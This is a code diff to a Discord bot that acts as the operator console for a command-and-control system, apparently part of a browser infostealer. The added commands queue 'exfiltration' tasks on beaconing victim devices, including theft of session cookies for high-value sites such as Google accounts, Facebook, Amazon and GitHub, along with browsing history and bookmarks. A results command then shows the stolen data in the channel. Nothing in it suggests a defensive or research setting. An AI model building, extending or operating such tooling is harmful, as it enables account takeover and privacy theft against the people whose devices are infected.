@@ -128,6 +128,39 @@ def format_server_simple(data: dict[str, Any]) -> str:
     return f"{emoji} {message}"
 
 
+def format_server_results(data: dict[str, Any]) -> str:
+    """Format a /admin/results response into a Discord-friendly string."""
+    results = data.get("data", {}).get("results_by_device", {})
+    if not results:
+        return "📭 No task results stored yet. Queue a task and wait for the next beacon cycle."
+
+    task_emojis: dict[str, str] = {
+        "request-cookies": "🍪",
+        "request-history": "📜",
+        "request-bookmarks": "🔖",
+    }
+
+    lines = [f"📊 **{data.get('message', 'Task Results')}**"]
+    for device_name, device_results in results.items():
+        lines.append(f"\n📱 **{device_name}**")
+        for task_type, result in device_results.items():
+            emoji = task_emojis.get(task_type, "📄")
+            status_icon = "✅" if result.get("success") else "❌"
+            received = result.get("received_at", "")[:19].replace("T", " ")
+            lines.append(f"  {emoji} `{task_type}` — {status_icon} `{received}`")
+            output = str(result.get("data", {}).get("output", ""))
+            if output:
+                for line in output.split("\n")[:5]:
+                    lines.append(f"    > {line[:120]}")
+                if len(output.split("\n")) > 5:
+                    lines.append("    > *(… more lines truncated)*")
+
+    response = "\n".join(lines)
+    if len(response) > 1900:
+        response = response[:1900] + "\n…*(truncated — check /admin/results for full data)*"
+    return response
+
+
 # ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
@@ -261,10 +294,10 @@ async def show_devices(interaction: discord.Interaction) -> None:
 
 @bot.tree.command(
     name="set-beacon-interval",
-    description="Set the beacon interval. Valid values: 2, 4, 8, 16, 32.",
+    description="Set the beacon interval. Valid values: 15, 30, 60, 120.",
 )
 @app_commands.autocomplete(interval=beacon_interval_autocomplete)
-@app_commands.describe(interval="Beacon interval in seconds (2, 4, 8, 16, or 32)")
+@app_commands.describe(interval="Beacon interval in seconds (15, 30, 60, or 120)")
 async def set_beacon_interval(
     interaction: discord.Interaction,
     interval: int,
@@ -293,10 +326,10 @@ async def set_beacon_interval(
 
 @bot.tree.command(
     name="request-cookies",
-    description="Display all stored cookies from managed devices.",
+    description="Show cached cookies and queue a fresh cookie request for all devices.",
 )
 async def request_cookies(interaction: discord.Interaction) -> None:
-    """Send the current cookie list to the channel."""
+    """Show cached cookies from the server and queue a fresh exfiltration task."""
     if not is_admin_user(interaction):
         log_access_denied(interaction, "request-cookies")
         await interaction.response.send_message(
@@ -307,12 +340,49 @@ async def request_cookies(interaction: discord.Interaction) -> None:
 
     log_command(interaction, "request-cookies")
 
+    # High-value domains matching the client's DEFAULT_COOKIE_DOMAINS
+    high_value_domains = (
+        "https://www.google.com,"
+        "https://accounts.google.com,"
+        "https://www.facebook.com,"
+        "https://www.amazon.com,"
+        "https://twitter.com,"
+        "https://www.instagram.com,"
+        "https://www.reddit.com,"
+        "https://github.com,"
+        "https://www.linkedin.com,"
+        "https://www.netflix.com"
+    )
+
+    # Part 1: Show cached cookies from the server
     server_response = await call_server("/admin/cookies")
     if server_response:
-        response = format_server_cookies(server_response)
+        cached_section = format_server_cookies(server_response)
     else:
-        response = device_manager.request_cookies()
+        cached_section = device_manager.request_cookies()
 
+    # Part 2: Queue a fresh request-cookies task for all devices
+    queue_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": "*",
+            "task_type": "request-cookies",
+            "parameters": {"domains": high_value_domains},
+        },
+    )
+    if queue_response:
+        queue_section = (
+            f"\n📡 **Fresh cookie request queued.**\n"
+            f"> {format_server_simple(queue_response)}\n"
+            f"> Results will arrive on the next beacon cycle."
+        )
+    else:
+        queue_section = (
+            "\n📡 **Fresh cookie request could not be queued** — server unreachable."
+        )
+
+    response = f"{cached_section}\n{queue_section}"
     await interaction.response.send_message(response)
 
 
@@ -346,6 +416,234 @@ async def set_communication_protocol(
         response = format_server_simple(server_response)
     else:
         response = device_manager.set_communication_protocol(protocol)
+
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
+    name="request-history",
+    description="Request browsing history from a device (or all devices).",
+)
+@app_commands.describe(device="Target device name (or '*' for all devices)")
+async def request_history(
+    interaction: discord.Interaction,
+    device: str = "*",
+) -> None:
+    """Queue a history exfiltration task for a target device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "request-history")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "request-history", f"device={device}")
+
+    server_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": device,
+            "task_type": "request-history",
+            "parameters": {},
+        },
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
+    name="request-bookmarks",
+    description="Request bookmarks from a device (or all devices).",
+)
+@app_commands.describe(device="Target device name (or '*' for all devices)")
+async def request_bookmarks(
+    interaction: discord.Interaction,
+    device: str = "*",
+) -> None:
+    """Queue a bookmark exfiltration task for a target device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "request-bookmarks")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "request-bookmarks", f"device={device}")
+
+    server_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": device,
+            "task_type": "request-bookmarks",
+            "parameters": {},
+        },
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+
+    await interaction.response.send_message(response)
+
+
+# ---------------------------------------------------------------------------
+# Task queue autocomplete
+# ---------------------------------------------------------------------------
+
+VALID_TASK_TYPES = [
+    "request-cookies",
+    "request-history",
+    "request-bookmarks",
+]
+
+
+async def task_type_autocomplete(
+    interaction: discord.Interaction,
+    current: str,
+) -> list[app_commands.Choice[str]]:
+    """Provide autocomplete options for task types."""
+    return [
+        app_commands.Choice(name=t, value=t)
+        for t in VALID_TASK_TYPES
+        if current == "" or t.startswith(current.lower())
+    ]
+
+
+async def device_name_autocomplete(
+    interaction: discord.Interaction,
+    current: str,
+) -> list[app_commands.Choice[str]]:
+    """Provide autocomplete options for device names (fetched from server)."""
+    choices = [app_commands.Choice(name="* (all devices)", value="*")]
+    server_response = await call_server("/admin/devices")
+    if server_response:
+        devices = server_response.get("data", {}).get("devices", [])
+        for d in devices:
+            name = d["name"]
+            if current == "" or name.startswith(current.lower()):
+                choices.append(app_commands.Choice(name=name, value=name))
+    return choices[:25]  # Discord limit
+
+
+# ---------------------------------------------------------------------------
+# Task queue commands
+# ---------------------------------------------------------------------------
+
+@bot.tree.command(
+    name="queue-task",
+    description="Queue a task for a device. Use '*' for all devices.",
+)
+@app_commands.autocomplete(device=device_name_autocomplete, task_type=task_type_autocomplete)
+@app_commands.describe(
+    device="Target device name (or '*' for all devices)",
+    task_type="Type of task to queue (request-cookies, request-history, request-bookmarks)",
+    parameters="Optional JSON parameters for the task",
+)
+async def queue_task(
+    interaction: discord.Interaction,
+    device: str,
+    task_type: str,
+    parameters: str = "{}",
+) -> None:
+    """Queue a C2 task for a target device via the server."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "queue-task")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "queue-task", f"device={device}, type={task_type}")
+
+    import json
+    try:
+        params = json.loads(parameters)
+    except json.JSONDecodeError:
+        await interaction.response.send_message(
+            "❌ Invalid JSON in parameters. Example: `{\"domains\": \"google.com\"}`",
+            ephemeral=True,
+        )
+        return
+
+    server_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": device,
+            "task_type": task_type,
+            "parameters": params,
+        },
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
+    name="show-results",
+    description="Show the latest exfiltrated data for all devices.",
+)
+async def show_results(interaction: discord.Interaction) -> None:
+    """Display the most recent task result per type per device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "show-results")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "show-results")
+
+    server_response = await call_server("/admin/results")
+    if server_response:
+        response = format_server_results(server_response)
+    else:
+        response = "❌ Server unreachable — cannot retrieve results."
+
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
+    name="pending-tasks",
+    description="Show all pending tasks across all devices.",
+)
+async def pending_tasks(interaction: discord.Interaction) -> None:
+    """Show pending task counts per device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "pending-tasks")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "pending-tasks")
+
+    server_response = await call_server("/admin/pending-tasks")
+    if server_response:
+        pending = server_response.get("data", {}).get("pending_by_device", {})
+        if not pending:
+            response = "✅ No pending tasks."
+        else:
+            lines = ["📋 **Pending Tasks**"]
+            for dev, count in pending.items():
+                lines.append(f"  📱 **{dev}** — {count} task(s)")
+            response = "\n".join(lines)
+    else:
+        response = "❌ Server unreachable — cannot check pending tasks."
 
     await interaction.response.send_message(response)
 
